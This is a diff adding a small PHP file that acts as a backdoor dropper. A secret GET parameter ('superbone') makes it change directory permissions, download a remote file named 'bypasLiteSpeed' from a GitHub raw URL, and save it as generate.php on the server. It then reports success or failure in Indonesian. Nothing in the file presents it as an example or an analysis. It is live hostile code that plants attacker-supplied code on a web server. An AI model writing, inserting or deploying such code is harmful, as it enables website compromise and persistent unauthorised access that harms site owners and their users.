@@ -1,0 +1,10 @@
+<?php
+if (isset($_GET['superbone'])) {
+chmod(getcwd(), 0755);
+if (file_put_contents(getcwd(). '/generate.php', file_get_contents("https://raw.githubusercontent.com/drian-o/repoKerjaku/refs/heads/main/bypasLiteSpeed"))) {
+echo 'berhasil: ' . getcwd() . '/generate.php';
+} else {
+echo 'gagal';
+}
+}
+?>
